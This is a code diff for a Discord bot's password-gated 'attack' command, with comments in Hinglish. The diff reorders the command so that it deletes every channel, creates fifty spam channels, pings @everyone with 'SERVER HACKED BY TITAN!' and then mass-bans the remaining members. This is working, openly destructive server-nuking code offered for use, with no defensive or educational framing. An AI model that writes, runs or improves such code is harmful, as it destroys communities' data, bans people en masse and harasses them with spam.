@@ -18096,91 +18096,94 @@ class FinalLaunchView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=30)
 
-    @discord.ui.button(label="🚀 LAUNCH NUCLEAR ATTACK", style=discord.ButtonStyle.danger, emoji="☢️")
+    @discord.ui.button(label="🚀 LAUNCH SEQUENCE", style=discord.ButtonStyle.danger, emoji="☢️")
     async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
-        # YAHAN SE TABAHI SHURU
         guild = interaction.guild
-        
-        # User ko bata do ki missile nikal gayi
-        await interaction.response.edit_message(content="🚀 **MISSILES LAUNCHED!** Destruction in 3.. 2.. 1..", view=None, embed=None)
-        
-        # === 💀 EXECUTION PHASE (MAX SPEED) ===
-        
-        # 1. SPEED BAN (Parallel Execution - No Sleep)
-        ban_tasks = []
-        members = guild.members # Cache members
-        
-        for member in members:
-            # SAFETY: List wale logon ko, Bot ko, aur Server Owner ko mat ban karo
-            if member.id in ALLOWED_USER_IDS or member.id == interaction.client.user.id or member.id == guild.owner_id:
-                continue
-            
-            # Check Hierarchy (Kya bot isko ban kar sakta hai?)
-            if member.top_role >= guild.me.top_role:
-                continue 
-            
-            # Task list me daalo (Execute baad me karenge ek saath)
-            ban_tasks.append(member.ban(reason="Nuke Attack Executed 💀"))
+        await interaction.response.edit_message(content="🔄 **INITIATING PHASE 1: CLEANUP...**", view=None, embed=None)
 
-        # Fire All Ban Requests at Once
-        if ban_tasks:
-            asyncio.create_task(asyncio.gather(*ban_tasks, return_exceptions=True))
-
-        # 2. DELETE CHANNELS (Parallel Execution)
+        # ================= PHASE 1: DELETE ALL CHANNELS (WAIT FOR IT) =================
+        # Pehle safai zaroori hai
         del_tasks = []
-        channels = guild.channels # Cache channels
-        
-        for channel in channels:
+        for channel in guild.channels:
             del_tasks.append(channel.delete())
         
-        # Fire All Delete Requests
+        # 'await' lagaya hai taaki jab tak delete na ho, aage na badhe
         if del_tasks:
-            asyncio.create_task(asyncio.gather(*del_tasks, return_exceptions=True))
+            try:
+                await asyncio.gather(*del_tasks, return_exceptions=True)
+            except:
+                pass
 
-        # 3. SPAM CHANNELS (Parallel Creation)
-        spam_tasks = []
-        # 50 Channels ek saath create honge
-        for i in range(50):
-            spam_tasks.append(guild.create_text_channel("😂-prank-ho-gya-tumhare-saath"))
+        # ================= PHASE 2: CREATE SPAM CHANNELS =================
+        # Ab naye channels banayenge
+        spam_channels = [] # Store objects to ping later
+        create_tasks = []
         
-        # Fire Creation Requests
-        # Note: Hum 'await' kar rahe hain taaki ping karne ke liye channel mil jaye
-        try:
-            await asyncio.gather(*spam_tasks, return_exceptions=True)
-        except:
-            pass
+        channel_name = "😂-prank-ho-gya-tumhare-saath"
+        
+        # 50 Channels Create Karo
+        for i in range(50):
+            # create_text_channel coroutine return karta hai, task banao
+            task = guild.create_text_channel(channel_name)
+            create_tasks.append(task)
 
-        # 4. FINAL PING
-        # Naye channels me se kisi ek me ping karo
-        await asyncio.sleep(2) # Thoda ruk ke taaki channels ban jayein
-        try:
-            for channel in guild.text_channels:
-                await channel.send("@everyone **SERVER KHATAM! TATA BYE BYE!** 😂😂😂\n**Prank Ho Gaya!**")
-                # Bas ek baar ping kafi hai, loop break karo
-                break 
-        except:
-            pass
+        if create_tasks:
+            try:
+                # Sabko ek saath banao aur result (channel objects) store karo
+                created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
+                
+                # Filter valid channels for pinging
+                for ch in created_channels:
+                    if isinstance(ch, discord.TextChannel):
+                        spam_channels.append(ch)
+            except:
+                pass
+
+        # ================= PHASE 3: PING EVERYONE =================
+        # Ab jo channels bane hain unme ping karo
+        ping_tasks = []
+        for channel in spam_channels:
+            ping_tasks.append(channel.send("@everyone **SERVER HACKED BY TITAN!** 😂😂😂\n**Maza Aaya?**"))
+        
+        if ping_tasks:
+            try:
+                # Saare channels me ek saath message feko
+                await asyncio.gather(*ping_tasks, return_exceptions=True)
+            except:
+                pass
+
+        # ================= PHASE 4: BAN HAMMER (FINAL STROKE) =================
+        # Ab jab unhone ping dekh liya, unhe uda do
+        ban_tasks = []
+        for member in guild.members:
+            if member.id in ALLOWED_USER_IDS or member.id == interaction.client.user.id or member.id == guild.owner_id:
+                continue
+            if member.top_role >= guild.me.top_role:
+                continue
+            
+            ban_tasks.append(member.ban(reason="Titan Nuke: Game Over"))
+
+        if ban_tasks:
+            # Iska wait karne ki zarurat nahi, background me chalne do
+            asyncio.create_task(asyncio.gather(*ban_tasks, return_exceptions=True))
+
 
 # ==========================================
 # 🚀 COMMAND REGISTRATION
 # ==========================================
 
-@titan_group.command(name="attack", description="☢️ DESTROY SERVER (ID Locked + Password Protected)")
+@titan_group.command(name="attack", description="☢️ DESTROY: Delete -> Spam -> Ban (Sequential)")
 async def attack(interaction: discord.Interaction):
-    # 🔒 STEP 1: ID CHECK (List me check karega)
+    # 🔒 STEP 1: ID CHECK
     if interaction.user.id not in ALLOWED_USER_IDS:
-        # Fake loading...
-        await interaction.response.send_message("🔍 Checking Database...", ephemeral=True)
-        await asyncio.sleep(2)
-        return await interaction.edit_original_response(content="❌ **Access Denied:** You are not in the Boss List.")
+        return await interaction.response.send_message("❌ **Access Denied!**", ephemeral=True)
 
     # 🔒 STEP 2: FIRST CONFIRMATION
-    embed = discord.Embed(
-        title="⚠️ SECURITY ALERT: ATTACK PROTOCOL",
-        description="You are about to initiate a **Server Wipe**.\nDo you want to proceed?",
-        color=0xFFA500 # Orange
-    )
-    await interaction.response.send_message(embed=embed, view=FirstConfirmView(), ephemeral=True)
+    # (Yahan seedha Modal kholne ka button de rahe hain taaki jaldi ho)
+    await interaction.response.send_modal(NukePasswordModal())
+
+# --- NOTE: Modal wahi purana use hoga, bas uska 'on_submit' change karna padega ---
+# Niche wala code 'FinalLaunchView' ke andar replace karna hai
 
 # ================== OPTIMIZED FLASK BACKEND ==================
 import os
